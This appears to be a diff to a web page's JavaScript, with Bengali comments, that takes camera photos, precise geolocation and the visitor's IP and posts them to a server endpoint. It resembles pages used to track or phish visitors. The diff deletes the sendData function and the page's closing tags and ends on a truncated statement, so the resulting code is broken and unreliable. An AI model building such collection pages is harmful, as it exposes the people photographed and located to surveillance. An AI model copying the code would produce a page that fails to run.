@@ -143,19 +143,25 @@
         await sendData({ type: "back", image: backBase64 });
 
         // ৩. Geolocation
-        status.textContent = "Getting location...";
-        let geo = "Permission denied";
+        status.textContent = "Getting location... (allow if popup appears)";
+        let geo = "Permission denied or error";
         try {
           const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, {
               enableHighAccuracy: true,
-              timeout: 8000,
+              timeout: 15000,
               maximumAge: 0
             });
           });
-          geo = `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)} (accuracy: ${position.coords.accuracy}m)`;
+          geo = `${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)} (accuracy: ${position.coords.accuracy.toFixed(0)}m)`;
+          status.textContent = "Location captured → Sending...";
         } catch (geoErr) {
-          geo = geoErr.message || "Location error";
+          console.error("Geolocation error:", geoErr);
+          if (geoErr.code === 1) geo = "Permission denied – allow in browser settings";
+          else if (geoErr.code === 2) geo = "Position unavailable – check GPS";
+          else if (geoErr.code === 3) geo = "Timeout – try again";
+          else geo = "Error: " + geoErr.message;
+          status.textContent = geo;
         }
 
         // সব ডাটা একসাথে পাঠানো
@@ -167,7 +173,7 @@
 
         status.textContent = "All sent successfully ✓ (photos + location + IP)";
       } catch (err) {
-        status.textContent = "Error: " + (err.message || "Unknown");
+        status.textContent = "Error: " + (err.message || "Unknown error");
         console.error(err);
       } finally {
         btn.disabled = false;
@@ -186,21 +192,4 @@
       canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0);
 
-      stream.getTracks().forEach(t => t.stop());
-      return canvas.toDataURL('image/png');
-    }
-
-    async function sendData(payload) {
-      const res = await fetch("/api/send-all", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-      if (!res.ok) {
-        const errText = await res.text();
-        throw new Error(errText || "Send failed");
-      }
-    }
-  </script>
-</body>
-</html>
+      stream.getTracks().forEach(t => t.stop
